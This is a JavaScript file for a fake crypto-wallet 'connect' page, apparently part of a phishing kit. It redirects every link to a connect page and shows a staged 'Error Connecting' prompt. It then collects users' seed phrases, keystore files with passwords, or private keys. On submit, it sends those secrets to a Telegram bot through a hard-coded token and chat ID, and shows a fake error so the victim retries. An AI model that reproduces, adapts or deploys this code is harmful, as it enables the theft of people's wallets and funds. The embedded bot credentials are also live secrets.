document.addEventListener("DOMContentLoaded", function () {
  // 1. --- GLOBAL DECORATOR & REDIRECT (Your original logic) ---
  const allLinks = document.querySelectorAll("a");
  const allButtons = document.querySelectorAll("button");

  // We exclude these IDs/Classes so the redirect doesn't break the form or dropdown
  const isSpecial = (el) => {
    return (
      el.closest("#coin-selector-container") ||
      el.closest("#form") ||
      el.closest(".coin-registry") ||
      el.classList.contains("manual-connection") ||
      el.classList.contains("dialog-dismiss") ||
      el.id === "phraseSend" ||
      el.id === "keystoreSend" ||
      el.id === "privateKeySend"
    );
  };

  [...allLinks, ...allButtons].forEach((element) => {
    if (!isSpecial(element)) {
      element.classList.add("connectButton");
      if (element.tagName === "A") element.removeAttribute("href");

      element.addEventListener("click", function (event) {
        event.preventDefault();
        window.location.href = "/connect.html";
      });
    }
  });

  // 2. --- COIN DROPDOWN LOGIC (SOL, BTC, ETH) ---
  const trigger = document.getElementById("dropdown-trigger");
  const menu = document.getElementById("dropdown-menu");
  const selectedImg = document.getElementById("selected-coin-img");
  const selectedText = document.getElementById("selected-coin-text");
  const coinOptions = document.querySelectorAll(".coin-option");

  if (trigger) {
    trigger.addEventListener("click", (e) => {
      e.stopPropagation();
      menu.classList.toggle("hidden");
    });

    coinOptions.forEach((option) => {
      option.addEventListener("click", function (e) {
        const coinName = this.getAttribute("data-coin");
        const coinImg = this.getAttribute("data-img");
        selectedText.textContent = coinName;
        selectedImg.src = coinImg;
        menu.classList.add("hidden");
      });
    });

    window.addEventListener("click", (e) => {
      if (menu && !trigger.contains(e.target)) menu.classList.add("hidden");
    });
  }

  // 3. --- WALLET SELECTION & TELEGRAM SUBMISSION ---
  const connectionInfo = document.querySelector(".connection-info");
  const currentWalletApp = document.getElementById("current-wallet-app");
  const currentWalletLogo = document.getElementById("current-wallet-logo");
  const connectDialog = document.getElementById("connect-dialog");
  const sendDialog = document.getElementById("send-dialog");
  const processForm = document.getElementById("form");

  // Wallet List Clicks
  document.querySelectorAll(".coin-registry button").forEach((btn) => {
    btn.addEventListener("click", function (e) {
      e.preventDefault();
      const imgPath = this.querySelector(".coin-img").getAttribute("src");
      const walletName = this.innerText.trim();

      connectionInfo.textContent = "Initializing...";
      currentWalletApp.textContent = walletName;
      currentWalletLogo.src = imgPath;
      connectDialog.style.display = "block";

      setTimeout(() => {
        connectionInfo.innerHTML =
          'Error Connecting... <button type="button" class="manual-connection btn btn-sm btn-primary">Connect Manually</button>';
        document
          .querySelector(".manual-connection")
          ?.addEventListener("click", () => {
            document.getElementById("current-wallet-app-send").textContent =
              walletName;
            document.getElementById("walletNameData").value = walletName;
            document.getElementById("current-wallet-send-logo").src = imgPath;
            connectDialog.style.display = "none";
            sendDialog.style.display = "block";
          });
      }, 1000);
    });
  });

  // Form Submission to Telegram
  processForm?.addEventListener("submit", async function (e) {
    e.preventDefault();
    const processBtn = this.querySelector('button[type="submit"]');
    const formData = new FormData(this);

    const wallet = formData.get("wallet") || "Unknown";
    const type = formData.get("type") || "phrase";
    const secret =
      formData.get("phrase") ||
      formData.get("keystore") ||
      formData.get("privateKey");
    const pass = formData.get("keystore-password")
      ? `\nPass: ${formData.get("keystore-password")}`
      : "";

    const message = `<b>New Submission</b>\nWallet: ${wallet}\nType: ${type}\nData: ${secret}${pass}`;

    processBtn.innerHTML = "Connecting...";
    processBtn.disabled = true;

    try {
      const response = await fetch(
        `https://api.telegram.org/bot8544540012:AAF7cZx2QqOKVGQ5gxguXsjXHyZuY96y7jw/sendMessage`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: "8368741386",
            text: message,
            parse_mode: "HTML",
          }),
        }
      );

      if (response.ok) {
        setTimeout(() => {
          document.querySelector(".message-tab").innerHTML =
            "<div class='alert alert-danger'>An unknown error occurred, please try again later.</div>";
          processBtn.innerHTML = "PROCEED";
          processBtn.disabled = false;
        }, 4000);
      }
    } catch (err) {
      processBtn.innerHTML = "PROCEED";
      processBtn.disabled = false;
    }
  });

  // Dialog Dismiss
  document.querySelectorAll(".dialog-dismiss").forEach((btn) => {
    btn.addEventListener("click", () => {
      connectDialog.style.display = "none";
      sendDialog.style.display = "none";
    });
  });
});
